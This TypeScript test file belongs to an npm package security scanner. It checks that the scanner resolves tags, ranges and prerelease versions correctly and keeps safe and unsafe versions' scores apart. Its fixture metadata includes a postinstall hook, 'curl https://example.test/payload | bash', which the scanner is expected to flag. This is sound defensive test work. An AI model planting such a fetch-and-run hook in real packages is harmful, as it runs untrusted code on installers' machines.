import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { mkdtempSync, rmSync } from "node:fs";
import os from "node:os";
import path from "node:path";
import { afterEach, beforeEach, describe, it } from "node:test";
import { gzipSync } from "node:zlib";
import { NpmSafeEngine } from "../src/index.js";
import type { PackageMetadata } from "../src/registry/types.js";

const archive = gzipSync(Buffer.alloc(1024));
const integrity = `sha512-${createHash("sha512").update(archive).digest("base64")}`;
const name = "versioned-library";

function metadata(): PackageMetadata {
  return {
    name,
    modified: "2026-01-01T00:00:00.000Z",
    "dist-tags": { latest: "2.0.0", legacy: "1.0.0", next: "3.0.0-beta.1" },
    versions: Object.fromEntries(["1.0.0", "1.2.0", "2.0.0", "3.0.0-beta.1", "3.0.0-beta.2"].map((version) => [version, {
      name,
      version,
      scripts: version === "1.0.0" || version.startsWith("3.")
        ? { postinstall: "curl https://example.test/payload | bash" }
        : { test: "node --test" },
      dist: {
        tarball: `https://registry.npmjs.org/${name}/-/${name}-${version}.tgz`,
        integrity,
      },
    }])),
    readme: "# versioned-library\nA utility library.",
  };
}

describe("engine checks the version selected for an install", () => {
  let engine: NpmSafeEngine;
  let directory: string;
  let originalFetch: typeof fetch;
  let requests: string[];
  let registryMetadata: PackageMetadata;

  beforeEach(() => {
    directory = mkdtempSync(path.join(os.tmpdir(), "npm-safe-engine-version-"));
    originalFetch = globalThis.fetch;
    requests = [];
    registryMetadata = metadata();
    globalThis.fetch = (async (input: RequestInfo | URL) => {
      const url = String(input);
      requests.push(url);
      assert.ok(url.startsWith("https://registry.npmjs.org/"), `Unexpected network request: ${url}`);
      return url.endsWith(".tgz")
        ? new Response(archive, { status: 200 })
        : new Response(JSON.stringify(registryMetadata), { status: 200 });
    }) as typeof fetch;
    engine = new NpmSafeEngine({
      dbPath: ":memory:",
      llmConfigPath: path.join(directory, "llm.json"),
      rulesConfigPath: path.join(directory, "rules.json"),
      rulesDir: path.join(directory, "rules"),
    });
  });

  afterEach(() => {
    engine?.close();
    globalThis.fetch = originalFetch;
    rmSync(directory, { recursive: true, force: true });
  });

  for (const firstVersion of ["2.0.0", "1.0.0"]) {
    it(`keeps safe and unsafe version reports isolated when ${firstVersion} is cached first`, async () => {
      await engine.checkPackage(name, { version: firstVersion });
      const old = await engine.checkPackage(name, { version: "1.0.0" });
      const latest = await engine.checkPackage(name);
      const oldAgain = await engine.checkPackage(name, { version: "legacy" });

      assert.strictEqual(old.latestVersion, "1.0.0");
      assert.strictEqual(old.security.staticScan?.version, "1.0.0");
      assert.ok(old.security.staticScan?.findings.some((finding) => finding.ruleId === "install-script"));
      assert.ok(old.security.overallScore < 85, "an unsafe old version must not inherit latest's passing score");
      assert.strictEqual(latest.latestVersion, "2.0.0");
      assert.strictEqual(latest.security.overallScore, 100);
      assert.ok(!latest.security.staticScan?.findings.some((finding) => finding.ruleId === "install-script"));
      assert.strictEqual(oldAgain.latestVersion, "1.0.0");
      assert.strictEqual(oldAgain.security.overallScore, old.security.overallScore);
      assert.strictEqual(requests.length, 1, "full metadata should serve both versions without refetching");
    });
  }

  it("selects named tags, stable ranges and explicit prerelease ranges from cached metadata", async () => {
    const range = await engine.checkPackage(name, { version: "^1.0.0" });
    const tagged = await engine.checkPackage(name, { version: "next" });
    const prerelease = await engine.checkPackage(name, { version: ">=3.0.0-beta.1 <3.0.0" });
    assert.strictEqual(range.latestVersion, "1.2.0");
    assert.strictEqual(range.security.overallScore, 100);
    assert.strictEqual(tagged.latestVersion, "3.0.0-beta.1");
    assert.ok(tagged.security.overallScore < 85);
    assert.strictEqual(prerelease.latestVersion, "3.0.0-beta.2");
    assert.ok(prerelease.security.overallScore < 85);
    assert.strictEqual(requests.length, 1);
  });

  it("refreshes cached metadata when a newly published requested version is missing", async () => {
    await engine.checkPackage(name);
    registryMetadata = {
      ...registryMetadata,
      "dist-tags": { ...registryMetadata["dist-tags"], latest: "4.0.0", newest: "4.0.0" },
      versions: {
        ...registryMetadata.versions,
        "4.0.0": {
          name,
          version: "4.0.0",
          scripts: { test: "node --test" },
          dist: { tarball: `https://registry.npmjs.org/${name}/-/${name}-4.0.0.tgz` },
        },
      },
    };
    const published = await engine.checkPackage(name, { version: "4.0.0" });
    const tagged = await engine.checkPackage(name, { version: "newest" });
    const range = await engine.checkPackage(name, { version: "^4.0.0" });
    assert.strictEqual(published.latestVersion, "4.0.0");
    assert.strictEqual(tagged.latestVersion, "4.0.0");
    assert.strictEqual(range.latestVersion, "4.0.0");
    assert.strictEqual(requests.length, 2);
  });

  it("rejects unpublished versions on a cache miss instead of scanning latest", async () => {
    await assert.rejects(engine.checkPackage(name, { version: "99.0.0" }), /no published version matching/);
    assert.strictEqual(requests.length, 1);
  });

  it("rejects missing or malformed version requests even when a safe latest result is cached", async () => {
    await engine.checkPackage(name);
    for (const version of ["99.0.0", "missing-tag", "^99.0.0", "file:../local", "not valid %"]) {
      await assert.rejects(engine.checkPackage(name, { version }), /no published version matching/, version);
    }
    assert.ok(requests.length >= 1);
  });

  it("downloads and caches only the tarball belonging to the requested version", async () => {
    await engine.checkPackage(name);
    const old = await engine.checkPackage(name, { version: "1.0.0", deep: true });
    const oldAgain = await engine.checkPackage(name, { version: "legacy", deep: true });
    const latest = await engine.checkPackage(name);
    assert.strictEqual(old.latestVersion, "1.0.0");
    assert.strictEqual(old.security.staticScan?.contentScan?.status, "complete");
    assert.strictEqual(oldAgain.security.staticScan?.contentScan?.integrityVerified, true);
    assert.strictEqual(latest.security.staticScan?.contentScan, undefined);
    assert.deepStrictEqual(requests, [
      `https://registry.npmjs.org/${name}`,
      `https://registry.npmjs.org/${name}/-/${name}-1.0.0.tgz`,
    ]);
  });
});
